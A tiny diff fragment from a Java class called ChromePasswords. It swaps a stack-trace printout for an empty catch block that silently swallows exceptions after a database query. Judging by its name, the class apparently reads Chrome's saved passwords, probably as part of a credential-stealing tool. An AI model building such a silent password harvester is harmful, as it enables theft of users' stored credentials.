@@ -92,8 +92,7 @@ public class ChromePasswords implements Request {
             statement.close();
             conn.close();
 
-        }catch (Exception e){
-            e.printStackTrace();
+        }catch (Exception ignored){
         }
 
         return info;
